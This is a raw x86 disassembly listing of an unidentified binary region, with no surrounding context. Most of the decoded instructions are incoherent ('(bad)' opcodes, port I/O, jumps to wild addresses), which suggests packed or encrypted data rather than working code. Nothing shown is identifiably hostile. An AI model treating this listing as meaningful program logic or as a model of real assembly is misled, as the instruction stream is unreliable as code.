  407a43:	d0 b9 b3 85 86 d9    	sarb   $1,-0x26797a4d(%ecx)
  407a49:	d0 e9                	shr    $1,%cl
  407a4b:	07                   	pop    %es
  407a4c:	87 36                	xchg   %esi,(%esi)
  407a4e:	74 fa                	je     0x407a4a
  407a50:	41                   	inc    %ecx
  407a51:	0d 9d 7e 50 88       	or     $0x88507e9d,%eax
  407a56:	43                   	inc    %ebx
  407a57:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  407a58:	1f                   	pop    %ds
  407a59:	94                   	xchg   %eax,%esp
  407a5a:	89 d0                	mov    %edx,%eax
  407a5c:	e9 07 65 8a 74       	jmp    0x74cadf68
  407a61:	fa                   	cli
  407a62:	41                   	inc    %ecx
  407a63:	d9 8b 9d 7e 50 36    	(bad) 0x36507e9d(%ebx)
  407a69:	8c ab 1f 94 0d 8d    	mov    %gs,-0x72f26be1(%ebx)
  407a6f:	fc                   	cld
  407a70:	15 10 74 51 3a       	adc    $0x3a517410,%eax
  407a75:	30 ff                	xor    %bh,%bh
  407a77:	8e 52 66             	mov    0x66(%edx),%ss
  407a7a:	26 61                	es popa
  407a7c:	02 73 6b             	add    0x6b(%ebx),%dh
  407a7f:	56                   	push   %esi
  407a80:	fd                   	std
  407a81:	69 0d 62 1d 40 40 09 	imul   $0xc1ee3d09,0x40401d62,%ecx
  407a88:	3d ee c1 
  407a8b:	8f                   	(bad)
  407a8c:	37                   	aaa
  407a8d:	b3 e3                	mov    $0xe3,%bl
  407a8f:	6c                   	insb   (%dx),%es:(%edi)
  407a90:	90                   	nop
  407a91:	60                   	pusha
  407a92:	2c f5                	sub    $0xf5,%al
  407a94:	0e                   	push   %cs
  407a95:	2a 3d 69 d3 28 2f    	sub    0x2f28d369,%bh
  407a9b:	78 4b                	js     0x407ae8
  407a9d:	c1 82 e2 40 ad 7e 48 	roll   $0x48,0x7ead40e2(%edx)
  407aa4:	86 91 dd 93 62 79    	xchg   %dl,0x796293dd(%ecx)
  407aaa:	92                   	xchg   %eax,%edx
  407aab:	3a 24 86             	cmp    (%esi,%eax,4),%ah
  407aae:	6e                   	outsb  %ds:(%esi),(%dx)
  407aaf:	93                   	xchg   %eax,%ebx
  407ab0:	0e                   	push   %cs
  407ab1:	c9                   	leave
  407ab2:	86 8e 94 43 b2 a1    	xchg   %cl,-0x5e4dbc6c(%esi)
  407ab8:	a3 95 90 6c e8       	mov    %eax,0xe86c9095
  407abd:	a8 96                	test   $0x96,%al
  407abf:	24 1b                	and    $0x1b,%al
  407ac1:	3a ea                	cmp    %dl,%ch
  407ac3:	97                   	xchg   %eax,%edi
  407ac4:	c9                   	leave
  407ac5:	86 8e 3a 98 08 ba    	xchg   %cl,-0x45f767c6(%esi)
  407acb:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407acc:	0e                   	push   %cs
  407acd:	3a df                	cmp    %bh,%bl
  407acf:	58                   	pop    %eax
  407ad0:	59                   	pop    %ecx
  407ad1:	23 1b                	and    (%ebx),%ebx
  407ad3:	99                   	cltd
  407ad4:	fb                   	sti
  407ad5:	fe                   	(bad)
  407ad6:	1b 52 35             	sbb    0x35(%edx),%edx
  407ad9:	74 6e                	je     0x407b49
  407adb:	e7 1d                	out    %eax,$0x1d
  407add:	8c fc                	mov    %?,%esp
  407adf:	fe                   	(bad)
  407ae0:	f5                   	cmc
  407ae1:	16                   	push   %ss
  407ae2:	06                   	push   %es
  407ae3:	0d 4d 65 a1 9a       	or     $0x9aa1654d,%eax
  407ae8:	68 bc ad 35 9b       	push   $0x9b35adbc
  407aed:	c4                   	(bad)
  407aee:	d0 ad 69 39 e2 cf    	shrb   $1,-0x301dc697(%ebp)
  407af4:	7f a6                	jg     0x407a9c
  407af6:	9c                   	pushf
  407af7:	19 6a 52             	sbb    %ebp,0x52(%edx)
  407afa:	ca 58 a6             	lret   $0xa658
  407afd:	37                   	aaa
  407afe:	1d 3d ea fc 6b       	sbb    $0x6bfcea3d,%eax
  407b03:	4a                   	dec    %edx
  407b04:	9d                   	popf
  407b05:	9e                   	sahf
  407b06:	ae                   	scas   %es:(%edi),%al
  407b07:	9d                   	popf
  407b08:	a8 8e                	test   $0x8e,%al
  407b0a:	9f                   	lahf
  407b0b:	a0 0c 9d 3b 3b       	mov    0x3b3b9d0c,%al
  407b10:	f0 a1 67 c7 fd 4b    	lock mov 0x4bfdc767,%eax
  407b16:	a2 f0 a3 76 dc       	mov    %al,0xdc76a3f0
  407b1b:	d9 71 f0             	fnstenv -0x10(%ecx)
  407b1e:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  407b1f:	f0 c7                	lock (bad)
  407b21:	9d                   	popf
  407b22:	1d 77 a5 f0 a6       	sbb    $0xa6f0a577,%eax
  407b27:	f0 dc d9             	lock (bad)
  407b2a:	71 67                	jno    0x407b93
  407b2c:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  407b2d:	f0 a8 9d             	lock test $0x9d,%al
  407b30:	1d 77 76 f0 a9       	sbb    $0xa9f07677,%eax
  407b35:	f0 aa                	lock stos %al,%es:(%edi)
  407b37:	d9 71 67             	fnstenv 0x67(%ecx)
  407b3a:	c7                   	(bad)
  407b3b:	f0 ab                	lock stos %eax,%es:(%edi)
  407b3d:	f0 ac                	lock lods %ds:(%esi),%al
  407b3f:	53                   	push   %ebx
  407b40:	63 e8                	arpl   %ebp,%eax
  407b42:	dc ad a7 6c e8 f4    	fsubrl -0xb179359(%ebp)
  407b48:	ae                   	scas   %es:(%edi),%al
  407b49:	e3 ce                	jecxz  0x407b19
  407b4b:	8e fb                	mov    %ebx,%?
  407b4d:	f0 af                	lock scas %es:(%edi),%eax
  407b4f:	f0 ee                	lock out %al,(%dx)
  407b51:	ec                   	in     (%dx),%al
  407b52:	b8 b3 b0 f0 b1       	mov    $0xb1f0b0b3,%eax
  407b57:	ce                   	into
  407b58:	8e 3b                	mov    (%ebx),%?
  407b5a:	3b f0                	cmp    %eax,%esi
  407b5c:	b2 f0                	mov    $0xf0,%dl
  407b5e:	b3 ec                	mov    $0xec,%bl
  407b60:	b8 b3 e3 f0 b4       	mov    $0xb4f0e3b3,%eax
  407b65:	f0 b5 a9             	lock mov $0xa9,%ch
  407b68:	31 74 ee b6          	xor    %esi,-0x4a(%esi,%ebp,8)
  407b6c:	53                   	push   %ebx
  407b6d:	36 74 d4             	ss je  0x407b44
  407b70:	b7 71                	mov    $0x71,%bh
  407b72:	67 c7                	addr16 (bad)
  407b74:	59                   	pop    %ecx
  407b75:	f0 b8 f0 b7 d4 a9    	lock mov $0xa9d4b7f0,%eax
  407b7b:	d9 b9 47 9d 1a 43    	fnstcw 0x431a9d47(%ecx)
  407b81:	ba 51 a7 66 43       	mov    $0x4366a751,%edx
  407b86:	bb d4 a9 d9 d0       	mov    $0xd0d9a9d4,%ebx
  407b8b:	bc f6 71 36 74       	mov    $0x743671f6,%esp
  407b90:	bd 1d 0d 9d 6b       	mov    $0x6b9d0d1d,%ebp
  407b95:	6a be                	push   $0xffffffbe
  407b97:	e8 70 ce 94 bf       	call   0xbfd54a0c
  407b9c:	0c 01                	or     $0x1,%al
  407b9e:	c0 4c 31 74 ee       	rorb   $0xee,0x74(%ecx,%esi,1)
  407ba3:	3b a6 18 3a e7 c1    	cmp    -0x3e18c5e8(%esi),%esp
  407ba9:	19 04 9d 73 38 27 50 	sbb    %eax,0x50273873(,%ebx,4)
  407bb0:	9d                   	popf
  407bb1:	66 4b                	dec    %bx
  407bb3:	2b e8                	sub    %eax,%ebp
  407bb5:	03 27                	add    (%edi),%esp
  407bb7:	f9                   	stc
  407bb8:	a8 c2                	test   $0xc2,%al
  407bba:	e0 24                	loopne 0x407be0
  407bbc:	d7                   	xlat   %ds:(%ebx)
  407bbd:	2e 04 53             	cs add $0x53,%al
  407bc0:	22 6b 47             	and    0x47(%ebx),%ch
  407bc3:	04 c3                	add    $0xc3,%al
  407bc5:	14 67                	adc    $0x67,%al
  407bc7:	cb                   	lret
  407bc8:	d5 c4                	aad    $0xc4
  407bca:	8a a1 73 f5 c5 c5    	mov    -0x3a3a0a8d(%ecx),%ah
  407bd0:	d0 b9 7a c6 62 e8    	sarb   $1,-0x179d3986(%ecx)
  407bd6:	5c                   	pop    %esp
  407bd7:	3d c7 31 74 ae       	cmp    $0xae7431c7,%eax
  407bdc:	9e                   	sahf
  407bdd:	c8 09 3a 57          	enter  $0x3a09,$0x57
  407be1:	4f                   	dec    %edi
  407be2:	97                   	xchg   %eax,%edi
  407be3:	88 b5 48 b5 40 05    	mov    %dh,0x540b548(%ebp)
  407be9:	1b 80 00 e4 05 7a    	sbb    0x7a05e400(%eax),%eax
  407bef:	2f                   	das
  407bf0:	4c                   	dec    %esp
  407bf1:	dd a7 25 e2 8f a5    	frstor -0x5a701ddb(%edi)
  407bf7:	19 26                	sbb    %esp,(%esi)
  407bf9:	41                   	inc    %ecx
  407bfa:	37                   	aaa
  407bfb:	21 b9 63 22 24 f5    	and    %edi,-0xadbdd9d(%ecx)
  407c01:	d6                   	salc
  407c02:	98                   	cwtl
  407c03:	a0 21 67 04 78       	mov    0x78046721,%al
  407c08:	c3                   	ret
  407c09:	76 42                	jbe    0x407c4d
  407c0b:	a9 80 08 28 bc       	test   $0xbc280880,%eax
  407c10:	1d 69 49 25 8a       	sbb    $0x8a254969,%eax
  407c15:	6d                   	insl   (%dx),%es:(%edi)
  407c16:	a2 52 39 3b 2b       	mov    %al,0x2b3b3952
  407c1b:	96                   	xchg   %eax,%esi
  407c1c:	09 39                	or     %edi,(%ecx)
  407c1e:	2f                   	das
  407c1f:	2b ac 48 ff a0 86 19 	sub    0x1986a0ff(%eax,%ecx,2),%ebp
  407c26:	80 ad 85 35 67 64 28 	subb   $0x28,0x64673585(%ebp)
  407c2d:	ff 12                	call   *(%edx)
  407c2f:	6c                   	insb   (%dx),%es:(%edi)
  407c30:	cd 99                	int    $0x99
  407c32:	1a f3                	sbb    %bl,%dh
  407c34:	36 43                	ss inc %ebx
  407c36:	9f                   	lahf
  407c37:	23 06                	and    (%esi),%eax
  407c39:	35 d5 9a 24 86       	xor    $0x86249ad5,%eax
  407c3e:	35 67 6c f8 fe       	xor    $0xfef86c67,%eax
  407c43:	2e 86 35 e7 6a e8 fe 	xchg   %dh,%cs:0xfee86ae7
  407c4a:	5b                   	pop    %ebx
  407c4b:	86 35 67 69 d8 fe    	xchg   %dh,0xfed86967
  407c51:	5c                   	pop    %esp
  407c52:	86 35 e7 67 c8 fe    	xchg   %dh,0xfec867e7
  407c58:	70 86                	jo     0x407be0
  407c5a:	35 67 66 b8 fe       	xor    $0xfeb86667,%eax
  407c5f:	71 61                	jno    0x407cc2
  407c61:	cd f9                	int    $0xf9
  407c63:	1f                   	pop    %ds
  407c64:	a8 fe                	test   $0xfe,%al
  407c66:	72 58                	jb     0x407cc0
  407c68:	73 e6                	jae    0x407c50
  407c6a:	87 98 fe d6 9c f3    	xchg   %ebx,-0xc632902(%eax)
  407c70:	61                   	popa
  407c71:	73 35                	jae    0x407ca8
  407c73:	67 7b 18             	addr16 jnp 0x407c8e
  407c76:	88 fe                	mov    %bh,%dh
  407c78:	74 cd                	je     0x407c47
  407c7a:	79 1e                	jns    0x407c9a
  407c7c:	86 78 fe             	xchg   %bh,-0x2(%eax)
  407c7f:	75 6d                	jne    0x407cee
  407c81:	86 87 61 68 fe 76    	xchg   %al,0x76fe6861(%edi)
  407c87:	91                   	xchg   %eax,%ecx
  407c88:	e5 62                	in     $0x62,%eax
  407c8a:	fc                   	cld
  407c8b:	fe                   	(bad)
  407c8c:	11 14 17             	adc    %edx,(%edi,%edx,1)
  407c8f:	b3 be                	mov    $0xbe,%bl
  407c91:	fe                   	(bad)
  407c92:	12 b7 98 f5 8d fe    	adc    -0x1720a68(%edi),%dh
  407c98:	c5 ac 6f e4 13 fe 63 	lds    0x63fe13e4(%edi,%ebp,2),%ebp
  407c9f:	7d 23                	jge    0x407cc4
  407ca1:	b9 14 fe 7b ac       	mov    $0xac7bfe14,%ecx
  407ca6:	6f                   	outsl  %ds:(%esi),(%dx)
  407ca7:	1b 0e                	sbb    (%esi),%ecx
  407ca9:	fe                   	(bad)
  407caa:	df 08                	fisttps (%eax)
  407cac:	62 a2 16 84 39 81    	bound  %esp,-0x7ec67bea(%edx)
  407cb2:	59                   	pop    %ecx
  407cb3:	fd                   	std
  407cb4:	17                   	pop    %ss
  407cb5:	b1 61                	mov    $0x61,%cl
  407cb7:	ac                   	lods   %ds:(%esi),%al
  407cb8:	6f                   	outsl  %ds:(%esi),(%dx)
  407cb9:	fd                   	std
  407cba:	6b 35 8c f5 6d fd 6d 	imul   $0x6d,0xfd6df58c,%esi
  407cc1:	86 b1 be 6d fd 6e    	xchg   %dh,0x6efd6dbe(%ecx)
  407cc7:	30 d6                	xor    %dl,%dh
  407cc9:	b7 95                	mov    $0x95,%bh
  407ccb:	fd                   	std
  407ccc:	6f                   	outsl  %ds:(%esi),(%dx)
  407ccd:	cc                   	int3
  407cce:	fa                   	cli
  407ccf:	b6 cf                	mov    $0xcf,%dh
  407cd1:	fd                   	std
  407cd2:	ac                   	lods   %ds:(%esi),%al
  407cd3:	6f                   	outsl  %ds:(%esi),(%dx)
  407cd4:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  407cd5:	3b 1c fd fa 46 ae c3 	cmp    -0x3c51b906(,%edi,8),%ebx
  407cdc:	1d 6f 24 3a cc       	sbb    $0xcc3a246f,%eax
  407ce1:	fd                   	std
  407ce2:	1e                   	push   %ds
  407ce3:	38 d6                	cmp    %dl,%dh
  407ce5:	71 ac                	jno    0x407c93
  407ce7:	fd                   	std
  407ce8:	bd 1f fd be 20       	mov    $0x20befd1f,%ebp
  407ced:	8e 75 1c             	mov    0x1c(%ebp),%?
  407cf0:	eb fd                	jmp    0x407cef
  407cf2:	bf 21 fd c0 63       	mov    $0x63c0fd21,%edi
  407cf7:	1d c7 3a 22 fd       	sbb    $0xfd223ac7,%eax
  407cfc:	db 23                	(bad) (%ebx)
  407cfe:	fd                   	std
  407cff:	dc 58 c7             	fcompl -0x39(%eax)
  407d02:	b1 8e                	mov    $0x8e,%cl
  407d04:	24 fd                	and    $0xfd,%al
  407d06:	dd 25 fd de d6 71    	frstor 0x71d6defd
  407d0c:	ac                   	lods   %ds:(%esi),%al
  407d0d:	e3 26                	jecxz  0x407d35
  407d0f:	fc                   	cld
  407d10:	60                   	pusha
  407d11:	27                   	daa
  407d12:	75 1c                	jne    0x407d30
  407d14:	eb 38                	jmp    0x407d4e
  407d16:	fc                   	cld
  407d17:	61                   	popa
  407d18:	28 fc                	sub    %bh,%ah
  407d1a:	62 29                	bound  %ebp,(%ecx)
  407d1c:	1d c7 3a 8e fc       	sbb    $0xfc8e3ac7,%eax
  407d21:	63 2a                	arpl   %ebp,(%edx)
  407d23:	fc                   	cld
  407d24:	64 2b c7             	fs sub %edi,%eax
  407d27:	b1 8e                	mov    $0x8e,%cl
  407d29:	63 fc                	arpl   %edi,%esp
  407d2b:	65 2c fc             	gs sub $0xfc,%al
  407d2e:	66 2d 71 ac          	sub    $0xac71,%ax
  407d32:	e3 58                	jecxz  0x407d8c
  407d34:	fc                   	cld
  407d35:	67 2e fc             	addr16 cs cld
  407d38:	68 2f 9c ed 35       	push   $0x35ed9c2f
  407d3d:	d6                   	salc
  407d3e:	fc                   	cld
  407d3f:	69 09 d4 97 d4 04    	imul   $0x4d497d4,(%ecx),%ecx
  407d45:	58                   	pop    %eax
  407d46:	fc                   	cld
  407d47:	0a 21                	or     (%ecx),%ah
  407d49:	2c 94                	sub    $0x94,%al
  407d4b:	d3 3a                	sarl   %cl,(%edx)
  407d4d:	5a                   	pop    %edx
  407d4e:	83 f0 8d             	xor    $0xffffff8d,%eax
  407d51:	b8 fd b6 02 01       	mov    $0x102b6fd,%eax
  407d56:	58                   	pop    %eax
  407d57:	c7                   	(bad)
  407d58:	f9                   	stc
  407d59:	71 3a                	jno    0x407d95
  407d5b:	23 fc                	and    %esp,%edi
  407d5d:	b0 83                	mov    $0x83,%al
  407d5f:	18 06                	sbb    %al,(%esi)
  407d61:	a2 24 ad 75 6e       	mov    %al,0x6e75ad24
  407d66:	75 5a                	jne    0x407dc2
  407d68:	e7 d6                	out    %eax,$0xd6
  407d6a:	e1 25                	loope  0x407d91
  407d6c:	75 6e                	jne    0x407ddc
  407d6e:	1d df 26 e7 d6       	sbb    $0xd6e726df,%eax
  407d73:	01 ae 27 6e 1d e1    	add    %ebp,-0x1ee291d9(%esi)
  407d79:	5a                   	pop    %edx
  407d7a:	28 d6                	sub    %dl,%dh
  407d7c:	21 ae 75 29 1d e3    	and    %ebp,-0x1ce2d68b(%esi)
  407d82:	5a                   	pop    %edx
  407d83:	e7 2a                	out    %eax,$0x2a
  407d85:	41                   	inc    %ecx
  407d86:	ae                   	scas   %es:(%edi),%al
  407d87:	75 6e                	jne    0x407df7
  407d89:	2b e5                	sub    %ebp,%esp
  407d8b:	5a                   	pop    %edx
  407d8c:	e7 d6                	out    %eax,$0xd6
  407d8e:	ae                   	scas   %es:(%edi),%al
  407d8f:	75 6e                	jne    0x407dff
  407d91:	1d 2c 5a e7 d6       	sbb    $0xd6e75a2c,%eax
  407d96:	61                   	popa
  407d97:	2d 75 6e 1d e7       	sub    $0xe71d6e75,%eax
  407d9c:	2e e7 d6             	cs out %eax,$0xd6
  407d9f:	81 ae 2f 6e 1d e9 5a 	subl   $0xa1d6305a,-0x16e291d1(%esi)
  407da6:	30 d6 a1 
  407da9:	ae                   	scas   %es:(%edi),%al
  407daa:	75 31                	jne    0x407ddd
  407dac:	1d eb 5a e7 32       	sbb    $0x32e75aeb,%eax
  407db1:	c1 ae 75 6e 33 41 e8 	shrl   $0xe8,0x41336e75(%esi)
  407db8:	dd d6                	fst    %st(6)
  407dba:	fe                   	(bad)
  407dbb:	34 42                	xor    $0x42,%al
  407dbd:	ef                   	out    %eax,(%dx)
  407dbe:	b6 da                	mov    $0xda,%dh
  407dc0:	fe                   	(bad)
  407dc1:	35 7a b7 e5 0e       	xor    $0xee5b77a,%eax
  407dc6:	bb ad 77 10 fe       	mov    $0xfe1077ad,%ebx
  407dcb:	36 6d                	ss insl (%dx),%es:(%edi)
  407dcd:	c1 83 d0 fe 37 2b 1e 	roll   $0x1e,0x2b37fed0(%ebx)
  407dd4:	84 de                	test   %bl,%dh
  407dd6:	fe                   	(bad)
  407dd7:	38 f2                	cmp    %dh,%dl
  407dd9:	20 f4                	and    %dh,%ah
  407ddb:	6e                   	outsb  %ds:(%esi),(%dx)
  407ddc:	fe                   	(bad)
  407ddd:	39 07                	cmp    %eax,(%edi)
  407ddf:	a1 77 5b fd 3a       	mov    0x3afd5b77,%eax
  407de4:	08 bd db 9a fd 3b    	or     %bh,0x3bfd9adb(%ebp)
  407dea:	e8 dd 16 3d fd       	call   0xfd7d94cc
  407def:	ef                   	out    %eax,(%dx)
  407df0:	b6 ea                	mov    $0xea,%dh
  407df2:	41                   	inc    %ecx
  407df3:	3c b7                	cmp    $0xb7,%al
  407df5:	65 0f 42 fd          	gs cmovb %ebp,%edi
  407df9:	3d ad 7b 10 7a       	cmp    $0x7a107bad,%eax
  407dfe:	fd                   	std
  407dff:	3e e1 83             	loope,pt 0x407d85
  407e02:	d0 bb fd 3f 1f 84    	sarb   $1,-0x7be0c003(%ebx)
  407e08:	de 6d fd             	fisubrs -0x3(%ebp)
  407e0b:	40                   	inc    %eax
  407e0c:	20 f4                	and    %dh,%ah
  407e0e:	6e                   	outsb  %ds:(%esi),(%dx)
  407e0f:	2b fd                	sub    %ebp,%edi
  407e11:	41                   	inc    %ecx
  407e12:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407e13:	77 5b                	ja     0x407e70
  407e15:	fa                   	cli
  407e16:	6d                   	insl   (%dx),%es:(%edi)
  407e17:	ed                   	in     (%dx),%eax
  407e18:	6b b2 af c9 96 de 5b 	imul   $0x5b,-0x21693651(%edx),%esi
  407e1f:	7a b7                	jp     0x407dd8
  407e21:	c5 dd 56 bf 26 b6 fc 	vorpd  0x41fcb626(%edi),%ymm4,%ymm7
  407e28:	41 
  407e29:	e8 fd 42 f5 0f       	call   0x1035c12b
  407e2e:	42                   	inc    %edx
  407e2f:	ef                   	out    %eax,(%dx)
  407e30:	fd                   	std
  407e31:	43                   	inc    %ebx
  407e32:	60                   	pusha
  407e33:	18 7a b7             	sbb    %bh,-0x49(%edx)
  407e36:	fd                   	std
  407e37:	44                   	inc    %esp
  407e38:	ba d3 bb 2d c3       	mov    $0xc32dbbd3,%edx
  407e3d:	70 ef                	jo     0x407e2e
  407e3f:	88 25 fd 45 86 de    	mov    %ah,0xde8645fd
  407e45:	6d                   	insl   (%dx),%es:(%edi)
  407e46:	09 fc                	or     %edi,%esp
  407e48:	46                   	inc    %esi
  407e49:	f4                   	hlt
  407e4a:	6e                   	outsb  %ds:(%esi),(%dx)
  407e4b:	6b 18 77             	imul   $0x77,(%eax),%ebx
  407e4e:	5b                   	pop    %ebx
  407e4f:	c4 30                	les    (%eax),%esi
  407e51:	fc                   	cld
  407e52:	47                   	inc    %edi
  407e53:	db 2a                	fldt   (%edx)
  407e55:	86 a1 fc 48 96 31    	xchg   %ah,0x319648fc(%ecx)
  407e5b:	0c bd                	or     $0xbd,%al
  407e5d:	fc                   	cld
  407e5e:	49                   	dec    %ecx
  407e5f:	8e 61 e8             	mov    -0x18(%ecx),%fs
  407e62:	dd fc                	(bad)
  407e64:	4a                   	dec    %edx
  407e65:	0c 43                	or     $0x43,%al
  407e67:	ef                   	out    %eax,(%dx)
  407e68:	b6 fc                	mov    $0xfc,%dh
  407e6a:	4b                   	dec    %ebx
  407e6b:	18 7a b7             	sbb    %bh,-0x49(%edx)
  407e6e:	85 fc                	test   %edi,%esp
  407e70:	4c                   	dec    %esp
  407e71:	d0 bb ad 64 fc 4d    	sarb   $1,0x4dfc64ad(%ebx)
  407e77:	de 6d 29             	fisubrs 0x29(%ebp)
  407e7a:	c3                   	ret
  407e7b:	6e                   	outsb  %ds:(%esi),(%dx)
  407e7c:	6b 19 86             	imul   $0xffffff86,(%ecx),%ebx
  407e7f:	fc                   	cld
  407e80:	4e                   	dec    %esi
  407e81:	5b                   	pop    %ebx
  407e82:	cc                   	int3
  407e83:	30 f4                	xor    %dh,%ah
  407e85:	fc                   	cld
  407e86:	4f                   	dec    %edi
  407e87:	e8 9a 41 9c 50       	call   0x50dcc026
  407e8c:	08 ce                	or     %cl,%dh
  407e8e:	02 b7 1d f4 54 fc    	add    -0x3ab0be3(%edi),%dh
  407e94:	68 ee 09 13 0d       	push   $0xd1309ee
  407e99:	c7 42 98 40 7c 1a 54 	movl   $0x541a7c40,-0x68(%edx)
  407ea0:	f0 9c                	lock pushf
  407ea2:	0c 00                	or     $0x0,%al
  407ea4:	0a 0d b4 02 52 06    	or     0x65202b4,%cl
  407eaa:	40                   	inc    %eax
  407eab:	bf a6 12 cf 75       	mov    $0x75cf12a6,%edi
  407eb0:	42                   	inc    %edx
  407eb1:	26 2e da 51 18       	es ficoml %cs:0x18(%ecx)
  407eb6:	4b                   	dec    %ebx
  407eb7:	44                   	inc    %esp
  407eb8:	44                   	inc    %esp
  407eb9:	4d                   	dec    %ebp
  407eba:	0d 53 1d 2b 4a       	or     $0x4a2b1d53,%eax
  407ebf:	a2 fc 9e a9 f8       	mov    %al,0xf8a99efc
  407ec4:	60                   	pusha
  407ec5:	28 03                	sub    %al,(%ebx)
  407ec7:	44                   	inc    %esp
  407ec8:	06                   	push   %es
  407ec9:	42                   	inc    %edx
  407eca:	1b 27                	sbb    (%edi),%esp
  407ecc:	ca bc 1e             	lret   $0x1ebc
  407ecf:	18 fd                	sbb    %bh,%ch
  407ed1:	1c cb                	sbb    $0xcb,%al
  407ed3:	fc                   	cld
  407ed4:	2d a8 b9 56 15       	sub    $0x1556b9a8,%eax
  407ed9:	81 e0 7e dd 02 0e    	and    $0xe02dd7e,%eax
  407edf:	03 7d 04             	add    0x4(%ebp),%edi
  407ee2:	cc                   	int3
  407ee3:	f7 1b                	negl   (%ebx)
  407ee5:	99                   	cltd
  407ee6:	07                   	pop    %es
  407ee7:	03 ac ec f4 05 eb b6 	add    -0x4914fa0c(%esp,%ebp,8),%ebp
  407eee:	fb                   	sti
  407eef:	e7 15                	out    %eax,$0x15
  407ef1:	e2 39                	loop   0x407f2c
  407ef3:	48                   	dec    %eax
  407ef4:	5c                   	pop    %esp
  407ef5:	ff 59 95             	lcall  *-0x6b(%ecx)
  407ef8:	fa                   	cli
  407ef9:	37                   	aaa
  407efa:	e2 34                	loop   0x407f30
  407efc:	02 56 0f             	add    0xf(%esi),%dl
  407eff:	07                   	pop    %es
  407f00:	84 b4 39 ed c0 85 50 	test   %dh,0x5085c0ed(%ecx,%edi,1)
  407f07:	38 fb                	cmp    %bh,%bl
  407f09:	b4 28                	mov    $0x28,%ah
  407f0b:	90                   	nop
  407f0c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407f0d:	77 04                	ja     0x407f13
  407f0f:	9c                   	pushf
  407f10:	85 c1                	test   %eax,%ecx
  407f12:	a8 11                	test   $0x11,%al
  407f14:	00 15 28 84 67 6b    	add    %dl,0x6b678428
  407f1a:	71 4e                	jno    0x407f6a
  407f1c:	94                   	xchg   %eax,%esp
  407f1d:	5b                   	pop    %ebx
  407f1e:	e0 17                	loopne 0x407f37
  407f20:	bc 64 fe 67 4a       	mov    $0x4a67fe64,%esp
  407f25:	04 08                	add    $0x8,%al
  407f27:	10 4a 27             	adc    %cl,0x27(%edx)
  407f2a:	fb                   	sti
  407f2b:	94                   	xchg   %eax,%esp
  407f2c:	fc                   	cld
  407f2d:	31 d8                	xor    %ebx,%eax
  407f2f:	65 d1 f2             	gs shl $1,%edx
  407f32:	60                   	pusha
  407f33:	36 02 45 6c          	add    %ss:0x6c(%ebp),%al
  407f37:	71 48                	jno    0x407f81
  407f39:	08 14 8e             	or     %dl,(%esi,%ecx,4)
  407f3c:	b3 04                	mov    $0x4,%bl
  407f3e:	50                   	push   %eax
  407f3f:	82 94 c5 da 60 60 23 	adcb   $0x4c,0x236060da(%ebp,%eax,8)
  407f46:	4c 
  407f47:	dd 54 4a ef          	fstl   -0x11(%edx,%ecx,2)
  407f4b:	ec                   	in     (%dx),%al
  407f4c:	bc 84 01 c4 fe       	mov    $0xfec40184,%esp
  407f51:	3b 2f                	cmp    (%edi),%ebp
  407f53:	4c                   	dec    %esp
  407f54:	0d 76 df 95 39       	or     $0x3995df76,%eax
  407f59:	3f                   	aas
  407f5a:	59                   	pop    %ecx
  407f5b:	ee                   	out    %al,(%dx)
  407f5c:	ae                   	scas   %es:(%edi),%al
  407f5d:	3b 19                	cmp    (%ecx),%ebx
  407f5f:	8d 20                	lea    (%eax),%esp
  407f61:	50                   	push   %eax
  407f62:	a9 18 41 92 2d       	test   $0x2d924118,%eax
  407f67:	9c                   	pushf
  407f68:	8e 00                	mov    (%eax),%es
  407f6a:	1c 4b                	sbb    $0x4b,%al
  407f6c:	1d 55 3d 61 6d       	sbb    $0x6d613d55,%eax
  407f71:	28 89 89 c2 4e ec    	sub    %cl,-0x13b13d77(%ecx)
  407f77:	96                   	xchg   %eax,%esi
  407f78:	c1 c8 ce             	ror    $0xce,%eax
  407f7b:	50                   	push   %eax
  407f7c:	38 18                	cmp    %bl,(%eax)
  407f7e:	c6 47 90 c0          	movb   $0xc0,-0x70(%edi)
  407f82:	18 3e                	sbb    %bh,(%esi)
  407f84:	82 a4 79 08 47 21 65 	andb   $0x31,0x65214708(%ecx,%edi,2)
  407f8b:	31 
  407f8c:	60                   	pusha
  407f8d:	fb                   	sti
  407f8e:	e9 a6 b9 da 08       	jmp    0x91b3939
  407f93:	55                   	push   %ebp
  407f94:	5a                   	pop    %edx
  407f95:	97                   	xchg   %eax,%edi
  407f96:	36 78 a2             	ss js  0x407f3b
  407f99:	36 0c 06             	ss or  $0x6,%al
  407f9c:	ee                   	out    %al,(%dx)
  407f9d:	c0 87 1e 5a fe 99 d2 	rolb   $0xd2,-0x6601a5e2(%edi)
  407fa4:	02 0d 4b e7 16 78    	add    0x7816e74b,%cl
  407faa:	0b c1                	or     %ecx,%eax
  407fac:	04 33                	add    $0x33,%al
  407fae:	32 fe                	xor    %dh,%bh
  407fb0:	7e c5                	jle    0x407f77
  407fb2:	41                   	inc    %ecx
  407fb3:	68 ca 42 95 6a       	push   $0x6a9542ca
  407fb8:	d4 31                	aam    $0x31
  407fba:	b2 cd                	mov    $0xcd,%dl
  407fbc:	f9                   	stc
  407fbd:	9e                   	sahf
  407fbe:	a0 84 dc da 6c       	mov    0x6cdadc84,%al
  407fc3:	5c                   	pop    %esp
  407fc4:	08 86 29 03 02 c6    	or     %al,-0x39fdfcd7(%esi)
  407fca:	b2 b6                	mov    $0xb6,%dl
  407fcc:	f8                   	clc
  407fcd:	12 f5                	adc    %ch,%dh
  407fcf:	a2 62 08 9d 44       	mov    %al,0x449d0862
  407fd4:	d8 26                	fsubs  (%esi)
  407fd6:	3b dc                	cmp    %esp,%ebx
  407fd8:	d9 02                	flds   (%edx)
  407fda:	61                   	popa
  407fdb:	02 03                	add    (%ebx),%al
  407fdd:	bb 83 2e cf 04       	mov    $0x4cf2e83,%ebx
  407fe2:	29 df                	sub    %ebx,%edi
  407fe4:	8c 9f 1f 77 54 fc    	mov    %ds,-0x3ab88e1(%edi)
  407fea:	03 5f 75             	add    0x75(%edi),%ebx
  407fed:	fc                   	cld
  407fee:	e7 1d                	out    %eax,$0x1d
  407ff0:	04 03                	add    $0x3,%al
  407ff2:	04 a9                	add    $0xa9,%al
  407ff4:	d7                   	xlat   %ds:(%ebx)
  407ff5:	79 67                	jns    0x40805e
